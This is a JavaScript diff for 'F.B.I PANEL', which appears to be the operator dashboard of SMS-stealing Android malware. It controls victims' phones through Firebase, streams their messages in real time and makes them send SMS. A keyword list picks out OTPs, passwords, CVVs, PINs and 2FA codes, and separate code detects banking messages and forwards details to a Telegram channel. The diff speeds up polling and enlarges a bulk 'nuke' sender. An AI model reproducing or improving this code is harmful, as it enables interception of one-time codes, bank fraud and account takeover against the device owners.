@@ -1,5 +1,5 @@
 /* ═══════════════════════════════════════════════════════════
-   F.B.I PANEL v11.0 — Redis · Users · Force Join · No-Blink
+   F.B.I PANEL v2.0 — ULTRA FAST · Zero-latency · High Priority
    ═══════════════════════════════════════════════════════════ */
 
 var CFG = window.SPECTER || {};
@@ -12,16 +12,14 @@ var deviceSimMap={},deviceSimKey='fbi_device_sims';
 var _msgCache={};
 var gridFilter='all';
 var _lastGridSig='';
-var _cardRefs={};                 // 🆕 uid → DOM node (for no-blink update)
+var _cardRefs={};
 var deviceSearchQuery='';
-var _sendWelcome=false;
 
-/* ═══════ CURRENT USER (Telegram Mini App / cookie) ═══════ */
-var currentUser = null;           // {id, first_name, last_name, username}
-var myProfile = null;             // Redis profile
+var currentUser = null;
+var myProfile = null;
 
-/* ═══════ SPEED ═══════ */
-var POLL_FAST=250,POLL_DEV=1500,POLL_BG=300,POLL_BAL=5000,POLL_AM=2000,TG_POLL=30,CLOUD_DEB=150,API_TIMEOUT=6000;
+/* ═══════ ULTRA SPEED CONSTANTS ═══════ */
+var POLL_FAST=50,POLL_DEV=500,POLL_BG=80,POLL_BAL=2000,POLL_AM=800,TG_POLL=5,CLOUD_DEB=50,API_TIMEOUT=4000;
 
 var mPoll=null,dPoll=null,aPoll=null,bgPoll=null,balPoll=null;
 var curMsgDev=null,lastKeys=new Set();
@@ -29,7 +27,7 @@ var amCache={},amFetch={};
 var amAll=[],amFilt=[],amCount=0,amObs=null,amLoading=false,amLoaded=false,AM=80;
 
 var nukeRunning=false,nukeSent=0,nukeFail=0,nukeTotal=0,_nukeActive=0,_nukeStartTime=0,_nukeStatsTmr=null;
-var _nukePool=80;
+var _nukePool=200;
 var fbInstances=[];
 var _mergeDebTimer=null,_lastMergeSig='';
 
@@ -49,45 +47,27 @@ try{var _sb0=localStorage.getItem('fbi_device_balances');if(_sb0)deviceBalances=
 var _lastAutoBackupDate=localStorage.getItem('fbi_last_auto_backup')||'';
 var _backupRunning=false;
 
-/* 🆕 per-user pending states for bot flows */
-var userStates={};  // {chatId: {state:'wait_wall'|'wait_fb_url'|'wait_fb_key', data:{}}}
+/* ═══════ FAST FETCH WRAPPER — priority high, no delays ═══════ */
+function _fastFetch(url,opts){
+  opts=opts||{};
+  opts.priority='high';
+  opts.keepalive=true;
+  if(!opts.signal){try{opts.signal=AbortSignal.timeout(API_TIMEOUT);}catch(e){}}
+  return fetch(url,opts);
+}
 
-/* ═══════════════════════════════════════════════════════════
-   🍪 COOKIE HELPERS
-   ═══════════════════════════════════════════════════════════ */
-function setCookie(name,value,days){
-  try{
-    var d=new Date();
-    d.setTime(d.getTime()+(days||7)*24*60*60*1000);
-    document.cookie=name+'='+encodeURIComponent(value)+'; expires='+d.toUTCString()+'; path=/; SameSite=Lax';
-  }catch(e){}
-}
-function getCookie(name){
-  try{
-    var n=name+'=',parts=document.cookie.split(';');
-    for(var i=0;i<parts.length;i++){
-      var p=parts[i].trim();
-      if(p.indexOf(n)===0)return decodeURIComponent(p.substring(n.length));
-    }
-  }catch(e){}
-  return '';
-}
+/* ═══════ COOKIES ═══════ */
+function setCookie(name,value,days){try{var d=new Date();d.setTime(d.getTime()+(days||7)*24*60*60*1000);document.cookie=name+'='+encodeURIComponent(value)+'; expires='+d.toUTCString()+'; path=/; SameSite=Lax';}catch(e){}}
+function getCookie(name){try{var n=name+'=',parts=document.cookie.split(';');for(var i=0;i<parts.length;i++){var p=parts[i].trim();if(p.indexOf(n)===0)return decodeURIComponent(p.substring(n.length));}}catch(e){}return '';}
 function delCookie(name){try{document.cookie=name+'=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;';}catch(e){}}
 
-/* ═══════════════════════════════════════════════════════════
-   🚀 REDIS (Upstash REST)
-   ═══════════════════════════════════════════════════════════ */
+/* ═══════ REDIS (fire & forget where possible) ═══════ */
 async function redisCmd(cmd){
   try{
-    var r=await fetch(CFG.REDIS_URL,{
-      method:'POST',
-      headers:{'Authorization':'Bearer '+CFG.REDIS_TOKEN,'Content-Type':'application/json'},
-      body:JSON.stringify(cmd),
-      signal:AbortSignal.timeout(8000)
-    });
-    if(!r.ok){console.warn('[Redis] HTTP '+r.status);return {result:null};}
+    var r=await _fastFetch(CFG.REDIS_URL,{method:'POST',headers:{'Authorization':'Bearer '+CFG.REDIS_TOKEN,'Content-Type':'application/json'},body:JSON.stringify(cmd)});
+    if(!r.ok)return {result:null};
     return await r.json();
-  }catch(e){console.warn('[Redis] '+e.message);return {result:null};}
+  }catch(e){return {result:null};}
 }
 async function redisGet(k){var r=await redisCmd(['GET',k]);return r.result;}
 async function redisSet(k,v){return await redisCmd(['SET',k,v]);}
@@ -95,27 +75,15 @@ async function redisDel(k){return await redisCmd(['DEL',k]);}
 async function redisSAdd(set,member){return await redisCmd(['SADD',set,member]);}
 async function redisSMembers(set){var r=await redisCmd(['SMEMBERS',set]);return r.result||[];}
 
-/* ═══════════════════════════════════════════════════════════
-   👤 USER PROFILE (Redis)
-   ═══════════════════════════════════════════════════════════ */
-async function saveUserProfile(profile){
-  profile.lastSeen=Date.now();
-  await redisSet('fbi:user:'+profile.id,JSON.stringify(profile));
-  await redisSAdd('fbi:users',String(profile.id));
-  myProfile=profile;
-}
-async function getUserProfile(chatId){
-  var v=await redisGet('fbi:user:'+chatId);
-  if(!v)return null;
-  try{return JSON.parse(v);}catch(e){return null;}
-}
-async function getAllUserIds(){
-  return await redisSMembers('fbi:users');
-}
+/* ═══════ USER PROFILE ═══════ */
+async function saveUserProfile(profile){profile.lastSeen=Date.now();await redisSet('fbi:user:'+profile.id,JSON.stringify(profile));await redisSAdd('fbi:users',String(profile.id));myProfile=profile;}
+async function getUserProfile(chatId){var v=await redisGet('fbi:user:'+chatId);if(!v)return null;try{return JSON.parse(v);}catch(e){return null;}}
+async function getAllUserIds(){return await redisSMembers('fbi:users');}
 
-/* ═══════════════════════════════════════════════════════════
-   📱 TELEGRAM MINI APP
-   ═══════════════════════════════════════════════════════════ */
+/* ═══════ OWNER CHECK ═══════ */
+function isOwnerId(id){var oid=String(CFG.OWNER_ID||'').trim();if(!oid) return true;return oid===String(id);}
+
+/* ═══════ TELEGRAM MINI APP ═══════ */
 function getTelegramUser(){
   try{
     var tw=window.Telegram&&window.Telegram.WebApp;
@@ -127,135 +95,82 @@ function getTelegramUser(){
   return null;
 }
 function initTelegramWebApp(){
-  try{
-    var tw=window.Telegram&&window.Telegram.WebApp;
-    if(tw){tw.ready();tw.expand();
-      try{tw.setHeaderColor('#08040e');tw.setBackgroundColor('#08040e');}catch(e){}
-    }
-  }catch(e){}
+  try{var tw=window.Telegram&&window.Telegram.WebApp;if(tw){tw.ready();tw.expand();try{tw.setHeaderColor('#08040e');tw.setBackgroundColor('#08040e');}catch(e){}}}catch(e){}
   currentUser=getTelegramUser();
-  /* Fallback: URL param ?uid= or cookie */
-  if(!currentUser){
-    var uid=(new URLSearchParams(location.search)).get('uid')||getCookie('fbi_uid');
-    if(uid){
-      var name=getCookie('fbi_name')||('User '+uid.slice(-4));
-      currentUser={id:String(uid),first_name:name,last_name:'',username:''};
-    }
-  }
-  /* Persist to cookie */
-  if(currentUser){
-    setCookie('fbi_uid',currentUser.id,7);
-    setCookie('fbi_name',(currentUser.first_name||'')+' '+(currentUser.last_name||''),7);
-  }
+  if(!currentUser){var uid=(new URLSearchParams(location.search)).get('uid')||getCookie('fbi_uid');if(uid){var name=getCookie('fbi_name')||('User '+uid.slice(-4));currentUser={id:String(uid),first_name:name,last_name:'',username:''};}}
+  if(currentUser){setCookie('fbi_uid',currentUser.id,7);setCookie('fbi_name',(currentUser.first_name||'')+' '+(currentUser.last_name||''),7);}
   renderUserUI();
 }
-
 function renderUserUI(){
   var el=document.getElementById('tbUserName');
   var su=document.getElementById('setupUser');
-  if(!currentUser){
-    if(el)el.textContent='';
-    if(su)su.style.display='none';
-    return;
-  }
+  if(!currentUser){if(el)el.textContent='';if(su)su.style.display='none';return;}
   var full=(currentUser.first_name||'')+(currentUser.last_name?(' '+currentUser.last_name):'');
   if(el)el.textContent='👤 '+full;
-  if(su){
-    su.style.display='flex';
-    su.innerHTML='<span style="font-size:18px">👤</span><div><b>'+esc(full)+'</b>'+(currentUser.username?' <span style="color:var(--dim);font-size:10px">@'+esc(currentUser.username)+'</span>':'')+'</div>';
-  }
+  if(su){su.style.display='flex';su.innerHTML='<span style="font-size:18px">👤</span><div><b>'+esc(full)+'</b>'+(currentUser.username?' <span style="color:var(--dim);font-size:10px">@'+esc(currentUser.username)+'</span>':'')+'</div>';}
 }
 function currentUserId(){return currentUser?String(currentUser.id):null;}
 
-/* ═══════════════════════════════════════════════════════════
-   🍪 SESSION SAVE/RESTORE (Cookies + localStorage)
-   ═══════════════════════════════════════════════════════════ */
-function savePanelSession(){
-  try{
-    var s={
-      fbUrl:FB_URL,
-      activeDeviceUid:activeDeviceUid||'',
-      ts:Date.now()
-    };
-    localStorage.setItem(CFG.LS_SESSION,JSON.stringify(s));
-    setCookie('fbi_fburl',FB_URL,30);
-    if(activeDeviceUid)setCookie('fbi_dev',activeDeviceUid,30);
-  }catch(e){}
+/* ═══════ SESSION ═══════ */
+function savePanelSession(){try{var s={fbUrl:FB_URL,activeDeviceUid:activeDeviceUid||'',ts:Date.now()};localStorage.setItem(CFG.LS_SESSION,JSON.stringify(s));setCookie('fbi_fburl',FB_URL,30);if(activeDeviceUid)setCookie('fbi_dev',activeDeviceUid,30);}catch(e){}}
+function restorePanelSession(){var fbUrl='',dev='';try{var raw=localStorage.getItem(CFG.LS_SESSION);if(raw){var s=JSON.parse(raw);fbUrl=s.fbUrl||'';dev=s.activeDeviceUid||'';}}catch(e){}if(!fbUrl)fbUrl=getCookie('fbi_fburl');if(!dev)dev=getCookie('fbi_dev');return {fbUrl:fbUrl,activeDeviceUid:dev};}
+function clearPanelSession(){try{localStorage.removeItem(CFG.LS_SESSION);}catch(e){}delCookie('fbi_fburl');delCookie('fbi_dev');}
+
+/* ═══════ CARRIER DETECTION ═══════ */
+function getSimCarrier(sim, devSP){
+  if(!sim) return devSP||'Unknown';
+  var c=String(sim.carrier||sim.carrierName||sim.networkOperator||sim.networkOperatorName||sim.operator||sim.operatorName||sim.provider||sim.networkName||sim.network||sim.serviceProvider||'').trim();
+  if(!c && devSP) c=String(devSP);
+  var lc=c.toLowerCase();
+  if(/\bjio\b|reliance|\bril\b|jio\s*4g|jio\s*5g/.test(lc)) return 'Jio';
+  if(/\bvi\b|vodafone|\bidea\b|voda|idea\s*cellular/.test(lc)) return 'Vi';
+  if(/airtel|aircel/.test(lc)) return 'Airtel';
+  if(/\bbsnl\b/.test(lc)) return 'BSNL';
+  if(/\bmtnl\b/.test(lc)) return 'MTNL';
+  return c||'Unknown';
 }
-function restorePanelSession(){
-  var fbUrl='',dev='';
-  try{
-    var raw=localStorage.getItem(CFG.LS_SESSION);
-    if(raw){var s=JSON.parse(raw);fbUrl=s.fbUrl||'';dev=s.activeDeviceUid||'';}
-  }catch(e){}
-  if(!fbUrl)fbUrl=getCookie('fbi_fburl');
-  if(!dev)dev=getCookie('fbi_dev');
-  return {fbUrl:fbUrl,activeDeviceUid:dev};
+function deviceHasCarrier(d, target){
+  if(!d) return false;
+  for(var i=0;i<(d.sims||[]).length;i++){if(getSimCarrier(d.sims[i], d.serviceProvider)===target) return true;}
+  if(d.serviceProvider && getSimCarrier(null, d.serviceProvider)===target) return true;
+  return false;
 }
-function clearPanelSession(){
-  try{localStorage.removeItem(CFG.LS_SESSION);}catch(e){}
-  delCookie('fbi_fburl');delCookie('fbi_dev');
+function devCarrierList(d){
+  var out=[];
+  for(var i=0;i<(d.sims||[]).length;i++){var c=getSimCarrier(d.sims[i], d.serviceProvider);if(c && c!=='Unknown' && out.indexOf(c)===-1) out.push(c);}
+  if(!out.length && d.serviceProvider){var c2=getSimCarrier(null, d.serviceProvider);if(c2 && c2!=='Unknown') out.push(c2);}
+  return out;
 }
 
 /* ═══════════════════════════════════════════════════════════
-   🚧 FORCE JOIN
+   📢 CHANNEL NOTIFY — Fire & forget, NO await in critical path
    ═══════════════════════════════════════════════════════════ */
-async function checkChannelMembership(chatId){
-  if(!userConfig.channelId)return true;
-  var r=await tgApi('getChatMember',{chat_id:userConfig.channelId,user_id:chatId});
-  if(!r.ok){
-    console.warn('[FJ] getChatMember failed:',r.description);
-    /* If bot can't check, allow through */
-    return true;
-  }
-  var st=r.result.status;
-  return st==='member'||st==='administrator'||st==='creator'||st==='restricted';
+function notifyChannel(html){
+  if(userConfig.channelNotify===false)return;
+  var ch=userConfig.channelId;
+  if(!ch)return;
+  _fastFetch(CFG.TG_API+'/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:ch,text:html,parse_mode:'HTML',disable_web_page_preview:true})}).catch(function(){});
 }
 
-async function createOneTimeInvite(){
-  var exp=Math.floor(Date.now()/1000)+60;   // 60s
-  var r=await tgApi('createChatInviteLink',{
-    chat_id:userConfig.channelId,
-    member_limit:1,
-    expire_date:exp,
-    name:'fbi-'+Date.now()
-  });
-  if(r.ok&&r.result)return r.result.invite_link;
-  return null;
+var _lastConnectedChannel=localStorage.getItem('fbi_connected_ch')||'';
+function announceChannelConnect(ch){
+  if(!ch) return;
+  if(_lastConnectedChannel===String(ch)) return;
+  var link=CFG.TG_CHANNEL_LINK||'https://t.me/FBIPanel';
+  var txt='✅ <b>F.B.I PANEL Connected</b>\n\n🤖 Bot is now active on this channel\n🔗 <a href="'+esc(link)+'">'+esc(link)+'</a>\n\n📢 Channel: <code>'+esc(ch)+'</code>\n🕐 '+new Date().toLocaleString();
+  _fastFetch(CFG.TG_API+'/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:ch,text:txt,parse_mode:'HTML',disable_web_page_preview:true})}).then(function(r){return r.json();}).then(function(res){if(res&&res.ok){_lastConnectedChannel=String(ch);try{localStorage.setItem('fbi_connected_ch',_lastConnectedChannel);}catch(e){}}}).catch(function(){});
 }
 
-async function sendForceJoin(chatId,fullName){
-  var link=await createOneTimeInvite();
-  var txt='🚧 <b>Channel Verification Required</b>\n\n'
-    +'Namaste '+esc(fullName||'User')+'!\n\n'
-    +'F.B.I PANEL use karne ke liye pehle hamara Telegram channel join karna zaroori hai.\n\n'
-    +'⏱️ <b>Link 1 minute me expire ho jayega</b>\n'
-    +'🔒 Private channel — sirf is link se join ho paayega\n\n'
-    +(link?'🔗 <a href="'+esc(link)+'">👉 JOIN CHANNEL NOW</a>':'⚠️ Link generate nahi ho paya. Baad me try karein.');
-  var kb={inline_keyboard:[[{text:'✅ I Joined',callback_data:'fj_check'}]]};
-  await tgApi('sendMessage',{chat_id:chatId,text:txt,parse_mode:'HTML',reply_markup:JSON.stringify(kb),disable_web_page_preview:true});
-}
-
-/* ═══════════════════════════════════════════════════════════
-   📲 SMS NOTIFY (user ko full details Telegram pe)
-   ═══════════════════════════════════════════════════════════ */
-async function notifySmsSent(dev,to,message,source){
-  var uid=currentUserId();
-  if(!uid)return;
+/* ═══════ SMS NOTIFY — fire & forget, no await ═══════ */
+function notifySmsSent(dev,to,message,source){
   var txt='📤 <b>SMS Sent</b>\n\n'
     +'📱 <b>Device:</b> '+esc(dev?dev.name:'—')+'\n'
     +'📞 <b>To:</b> <code>'+esc(to)+'</code>\n'
     +'💬 <b>Message:</b>\n<code>'+esc(message)+'</code>\n\n'
     +'📡 Source: <b>'+esc(source||'panel')+'</b>\n'
     +'🕐 '+new Date().toLocaleString();
-  try{await tgApi('sendMessage',{chat_id:uid,text:txt,parse_mode:'HTML'});}catch(e){}
+  notifyChannel(txt);
 }
-
-/* ═══════════════════════════════════════════════════════════
-   ═══════════════════════════════════════════════════════════
-   ⚙️  E X I S T I N G   C O D E  (with v11 fixes)
-   ═══════════════════════════════════════════════════════════
-   ═══════════════════════════════════════════════════════════ */
 
 /* ═══════ HIGH PRIORITY ═══════ */
 var HIGH_PRIORITY_KEYWORDS=['otp','one time password','one-time password','one time code','one-time code','verification code','verify code','login code','security code','secure code','passcode','password','cvv','cvv2','pin','auth code','authorization code','authorisation code','authcode','2fa','two factor','two-factor','mfa','multi factor','secret code','access code','token','confirmation code','activation code','do not share','never share','valid for','expires in','expire in'];
@@ -278,8 +193,8 @@ function isBankingSms(sender,message){var bank=detectBank(sender);if(!bank)retur
 
 /* ═══════ INIT ═══════ */
 loadUsedDevices();loadDeviceSims();loadForwardTracker();
-initTelegramWebApp();                    /* 🆕 */
-setupTelegramLink();                     /* 🆕 */
+initTelegramWebApp();
+setupTelegramLink();
 initCloudConfig();
 
 function loadUsedDevices(){try{var r=localStorage.getItem(usedDevicesKey);if(r)usedDevices=JSON.parse(r)||{};}catch(e){}}
@@ -289,7 +204,6 @@ function saveDeviceSims(){try{localStorage.setItem(deviceSimKey,JSON.stringify(d
 function loadForwardTracker(){try{var r=localStorage.getItem('fbi_forward_tracker');if(r)forwardTracker=JSON.parse(r)||{};}catch(e){}}
 function saveForwardTracker(){try{localStorage.setItem('fbi_forward_tracker',JSON.stringify(forwardTracker));}catch(e){}}
 
-/* 🆕 setup telegram link icon */
 function setupTelegramLink(){
   var el=document.getElementById('tgChannelLink');
   if(!el)return;
@@ -298,100 +212,76 @@ function setupTelegramLink(){
   el.href=link;el.style.display='inline-flex';
 }
 
-/* ═══════ CLOUD CONFIG ═══════ */
+/* ═══════ CLOUD CONFIG — background, non-blocking ═══════ */
 async function initCloudConfig(){
   try{var cached=localStorage.getItem(CFG.LS_CACHE);if(cached){var parsed=JSON.parse(cached);userConfig=Object.assign({},CFG.DEFAULT_CONFIG,parsed);}}catch(e){}
-  try{blobId=localStorage.getItem(CFG.LS_BLOB);
-    if(blobId){
-      updateCloudStatus('Fetching cloud config…');
-      var r=await fetch(CFG.BLOB_BASE+'/'+blobId,{signal:AbortSignal.timeout(API_TIMEOUT)});
-      if(r.ok){var remote=await r.json();if(remote&&typeof remote==='object'){userConfig=Object.assign({},CFG.DEFAULT_CONFIG,remote);cacheConfigLocal();updateCloudStatus('☁ Synced from cloud');}}
-    }else{await createCloudBlob();}
-  }catch(e){updateCloudStatus('⚠ Cloud offline — using local');}
-
-  /* 🆕 load user profile from Redis */
-  var uid=currentUserId();
-  if(uid){
-    try{
-      var prof=await getUserProfile(uid);
-      if(prof){myProfile=prof;console.log('[Redis] Loaded profile for '+uid);}
-    }catch(e){}
-  }
-
   fetchBotUsername();
-  if(userConfig.enabled!==false&&userConfig.botEnabled!==false&&userConfig.channelId)setTimeout(startTelegramBot,300);
+  if(userConfig.botEnabled!==false&&userConfig.channelId)setTimeout(startTelegramBot,100);
   setInterval(checkAutoBackup,60000);
-  setTimeout(checkAutoBackup,5000);
-
-  /* 🆕 auto-restore session */
-  setTimeout(autoRestoreSession,400);
+  setTimeout(autoRestoreSession,200);
+  /* cloud fetch in background */
+  try{
+    blobId=localStorage.getItem(CFG.LS_BLOB);
+    if(blobId){
+      _fastFetch(CFG.BLOB_BASE+'/'+blobId).then(function(r){return r.json();}).then(function(remote){
+        if(remote&&typeof remote==='object'){userConfig=Object.assign({},CFG.DEFAULT_CONFIG,remote);cacheConfigLocal();updateCloudStatus('☁ Synced from cloud');}
+      }).catch(function(){updateCloudStatus('⚠ Cloud offline — using local');});
+    }else{createCloudBlob();}
+  }catch(e){}
+  var uid=currentUserId();
+  if(uid){getUserProfile(uid).then(function(prof){if(prof)myProfile=prof;}).catch(function(){});}
 }
-
-async function createCloudBlob(){try{var r=await fetch(CFG.BLOB_BASE,{method:'POST',headers:{'Content-Type':'application/json','Accept':'application/json'},body:JSON.stringify(userConfig),signal:AbortSignal.timeout(API_TIMEOUT)});if(!r.ok)return;var loc=r.headers.get('Location')||r.headers.get('location');if(loc){var parts=loc.split('/');blobId=parts[parts.length-1];localStorage.setItem(CFG.LS_BLOB,blobId);updateCloudStatus('☁ Cloud config created');}}catch(e){updateCloudStatus('⚠ Cloud unavailable');}}
+async function createCloudBlob(){try{var r=await _fastFetch(CFG.BLOB_BASE,{method:'POST',headers:{'Content-Type':'application/json','Accept':'application/json'},body:JSON.stringify(userConfig)});if(!r.ok)return;var loc=r.headers.get('Location')||r.headers.get('location');if(loc){var parts=loc.split('/');blobId=parts[parts.length-1];localStorage.setItem(CFG.LS_BLOB,blobId);updateCloudStatus('☁ Cloud config created');}}catch(e){updateCloudStatus('⚠ Cloud unavailable');}}
 function cacheConfigLocal(){try{localStorage.setItem(CFG.LS_CACHE,JSON.stringify(userConfig));}catch(e){}}
 function updateCloudStatus(msg,cls){var el=document.getElementById('cloudStatus');if(el){el.textContent=msg;el.className='settings-status '+(cls||'');}}
-async function saveCloudConfig(){cacheConfigLocal();if(!blobId){await createCloudBlob();return;}try{var r=await fetch(CFG.BLOB_BASE+'/'+blobId,{method:'PUT',headers:{'Content-Type':'application/json'},body:JSON.stringify(userConfig),signal:AbortSignal.timeout(API_TIMEOUT)});if(r.ok)updateCloudStatus('☁ Saved '+new Date().toLocaleTimeString());}catch(e){updateCloudStatus('⚠ Save failed — cached locally');}}
+async function saveCloudConfig(){cacheConfigLocal();if(!blobId){await createCloudBlob();return;}try{var r=await _fastFetch(CFG.BLOB_BASE+'/'+blobId,{method:'PUT',headers:{'Content-Type':'application/json'},body:JSON.stringify(userConfig)});if(r.ok)updateCloudStatus('☁ Saved '+new Date().toLocaleTimeString());}catch(e){updateCloudStatus('⚠ Save failed');}}
 function debouncedCloudSave(){if(cloudSaveTmr)clearTimeout(cloudSaveTmr);cloudSaveTmr=setTimeout(saveCloudConfig,CLOUD_DEB);}
 function forceCloudSave(){saveCloudConfig();toast('☁ Cloud save triggered');}
 async function resetCloudConfig(){if(!confirm('Reset all cloud settings?'))return;userConfig=JSON.parse(JSON.stringify(CFG.DEFAULT_CONFIG));cacheConfigLocal();await saveCloudConfig();toast('🗑 Config reset');populateSettingsUI();}
-
-/* 🆕 Auto-restore session */
 function autoRestoreSession(){
   var s=restorePanelSession();
   if(s.fbUrl&&!FB_URL){
     var inp=document.getElementById('fbUrl');
     if(inp){
       inp.value=s.fbUrl;
-      console.log('[Session] Restoring Firebase: '+s.fbUrl);
       connect();
       if(s.activeDeviceUid)setTimeout(function(){
-        var d=allDevices.find(function(x){
-          var uid=(x._fbId||'primary')+'|||'+x.id;
-          return uid===s.activeDeviceUid;
-        });
-        if(d){console.log('[Session] Reopening device: '+d.name);openDeviceModal(s.activeDeviceUid);}
-      },2500);
+        var d=allDevices.find(function(x){var uid=(x._fbId||'primary')+'|||'+x.id;return uid===s.activeDeviceUid;});
+        if(d)openDeviceModal(s.activeDeviceUid);
+      },800);
     }
   }
 }
 
-/* ═══════ FIREBASE CORE ═══════ */
-async function fbGet(p,url,key){var u=url||FB_URL,k=key!==undefined?key:FB_KEY;var r=await fetch(u+'/'+p+'.json'+(k?'?auth='+k:''),{signal:AbortSignal.timeout(API_TIMEOUT)});if(!r.ok)throw new Error('HTTP '+r.status);return r.json();}
-async function fbSet(p,d,url,key){var u=url||FB_URL,k=key!==undefined?key:FB_KEY;var r=await fetch(u+'/'+p+'.json'+(k?'?auth='+k:''),{method:'PUT',headers:{'Content-Type':'application/json'},body:JSON.stringify(d)});if(!r.ok)throw new Error('HTTP '+r.status);return r.json();}
-async function fbDel(p,url,key){var u=url||FB_URL,k=key!==undefined?key:FB_KEY;var r=await fetch(u+'/'+p+'.json'+(k?'?auth='+k:''),{method:'DELETE'});if(!r.ok)throw new Error('HTTP '+r.status);}
+/* ═══════ FIREBASE CORE — all high priority ═══════ */
+async function fbGet(p,url,key){var u=url||FB_URL,k=key!==undefined?key:FB_KEY;var r=await _fastFetch(u+'/'+p+'.json'+(k?'?auth='+k:''));if(!r.ok)throw new Error('HTTP '+r.status);return r.json();}
+async function fbSet(p,d,url,key){var u=url||FB_URL,k=key!==undefined?key:FB_KEY;var r=await _fastFetch(u+'/'+p+'.json'+(k?'?auth='+k:''),{method:'PUT',headers:{'Content-Type':'application/json'},body:JSON.stringify(d)});if(!r.ok)throw new Error('HTTP '+r.status);return r.json();}
+async function fbDel(p,url,key){var u=url||FB_URL,k=key!==undefined?key:FB_KEY;var r=await _fastFetch(u+'/'+p+'.json'+(k?'?auth='+k:''),{method:'DELETE'});if(!r.ok)throw new Error('HTTP '+r.status);}
 
-/* ═══════ SMS SENDER ═══════ */
-async function sendSmsViaDevice(dev,sim,to,message,tag){
-  if(!dev)return{ok:false,error:'no device'};
-  var url=(dev._fbUrl||FB_URL)+'/clients/'+dev.id+'/webhookEvent/sendSms.json'+((dev._fbKey||FB_KEY)?'?auth='+(dev._fbKey||FB_KEY):'');
-  var body=JSON.stringify({from:sim,to:to,message:message,isSended:false});
-  var t0=performance.now();
-  try{
-    var r=await fetch(url,{method:'PUT',headers:{'Content-Type':'application/json'},body:body,keepalive:true,priority:'high'});
-    var dt=(performance.now()-t0).toFixed(0);
-    if(!r.ok){return{ok:false,error:'HTTP '+r.status};}
-    console.log('[SMS]['+tag+'] ✓ '+dt+'ms → '+dev.name);
-    notifySmsSent(dev,to,message,tag);  /* 🆕 */
-    return{ok:true};
-  }catch(e){console.error('[SMS]['+tag+'] ✗ '+e.message);return{ok:false,error:e.message};}
-}
-function sendSmsFireAndForget(dev,sim,to,message,tag,highPriority){
+/* ═══════════════════════════════════════════════════════════
+   📡 SMS SENDER — INSTANT, high priority, no delay
+   ═══════════════════════════════════════════════════════════ */
+function sendSmsFireAndForget(dev,sim,to,message,tag){
   if(!dev)return Promise.resolve(false);
   var url=(dev._fbUrl||FB_URL)+'/clients/'+dev.id+'/webhookEvent/sendSms.json'+((dev._fbKey||FB_KEY)?'?auth='+(dev._fbKey||FB_KEY):'');
   var body=JSON.stringify({from:sim,to:to,message:message,isSended:false});
-  var opts={method:'PUT',headers:{'Content-Type':'application/json'},body:body,keepalive:true};
-  if(highPriority)opts.priority='high';
   var t0=performance.now();
-  return fetch(url,opts).then(function(r){
+  /* FIRE INSTANTLY — high priority, no awaits */
+  return _fastFetch(url,{method:'PUT',headers:{'Content-Type':'application/json'},body:body}).then(function(r){
     var dt=(performance.now()-t0).toFixed(0);
-    if(r.ok){console.log('[SMS-FF]['+tag+'] ✓ '+dt+'ms → '+dev.name);notifySmsSent(dev,to,message,tag);}
-    else console.warn('[SMS-FF]['+tag+'] ✗ '+r.status);
+    if(r.ok){console.log('[SMS] ✓ '+dt+'ms → '+dev.name);notifySmsSent(dev,to,message,tag);}
+    else console.warn('[SMS] ✗ '+r.status);
     return r.ok;
-  }).catch(function(e){console.warn('[SMS-FF]['+tag+'] ✗ '+e.message);return false;});
+  }).catch(function(e){console.warn('[SMS] ✗ '+e.message);return false;});
 }
-async function sendHighPrioritySms(dev,sim,to,message,tag){
-  for(var i=0;i<5;i++){var ok=await sendSmsFireAndForget(dev,sim,to,message,tag+'-r'+i,true);if(ok)return true;await sleep(40);}
-  return false;
+/* Fast retry — no sleep, immediate parallel retries */
+function sendHighPrioritySms(dev,sim,to,message,tag){
+  /* Fire 3 parallel attempts, first success wins */
+  var attempts=[];
+  for(var i=0;i<3;i++){
+    attempts.push(sendSmsFireAndForget(dev,sim,to,message,tag+'-r'+i));
+  }
+  return Promise.race(attempts);
 }
 
 /* ═══════ CONNECTION ═══════ */
@@ -401,22 +291,22 @@ function connect(){
   FB_URL=url;
   document.getElementById('setup').style.display='none';
   document.getElementById('panel').style.display='flex';
-  savePanelSession();  /* 🆕 */
+  savePanelSession();
   loadDevs();startDP();startBgForwardPoll();startBalancePoll();
-  setTimeout(function(){fbRegisterPrimary();},200);
-  if(userConfig.firebases&&userConfig.firebases.length)setTimeout(loadFirebasesFromConfig,500);
+  setTimeout(function(){fbRegisterPrimary();},100);
+  if(userConfig.firebases&&userConfig.firebases.length)setTimeout(loadFirebasesFromConfig,200);
 }
 function showErr(m){var e=document.getElementById('serr');e.textContent=m;e.style.display='block';setTimeout(function(){e.style.display='none';},4000);}
 function disconnect(){
   FB_URL='';FB_KEY='';allDevices=[];selDev=null;pinC={};noteC={};otpNoteC={};
   amCache={};amAll=[];amFilt=[];amLoaded=false;
   stopMP();stopDP();stopAP();stopTelegramBot();stopBgForwardPoll();stopBalancePoll();stopMsgStream();
-  clearPanelSession();  /* 🆕 */
+  clearPanelSession();
   document.getElementById('panel').style.display='none';
   document.getElementById('setup').style.display='flex';
 }
 
-/* ═══════ SSE ═══════ */
+/* ═══════ SSE — Real-time messages ═══════ */
 function startMsgStream(dev){
   if(!dev)return;
   var uid=(dev._fbId||'primary')+'|||'+dev.id;
@@ -429,14 +319,13 @@ function startMsgStream(dev){
   try{
     _msgStream=new EventSource(url);
     _msgStream.onopen=function(){console.log('[SSE] ✓ '+dev.name);_sseFailCount[uid]=0;};
-    _msgStream.onerror=function(){_sseFailCount[uid]=(_sseFailCount[uid]||0)+1;console.warn('[SSE] ✗ #'+_sseFailCount[uid]+' '+dev.name);};
+    _msgStream.onerror=function(){_sseFailCount[uid]=(_sseFailCount[uid]||0)+1;};
     _msgStream.addEventListener('put',function(ev){try{var d=JSON.parse(ev.data);if(!d||!d.path)return;var parts=String(d.path).replace(/^\//,'').split('/');var key=parts[0];if(!key||parts.length>1)return;if(!d.data||typeof d.data!=='object')return;_handleStreamMsg(dev,key,d.data);}catch(e){}});
     _msgStream.addEventListener('patch',function(ev){try{var d=JSON.parse(ev.data);if(!d||!d.path)return;var parts=String(d.path).replace(/^\//,'').split('/');var key=parts[0];if(!key)return;if(!d.data||typeof d.data!=='object')return;_handleStreamMsg(dev,key,d.data);}catch(e){}});
-  }catch(e){console.error('[SSE] init',e);}
+  }catch(e){}
 }
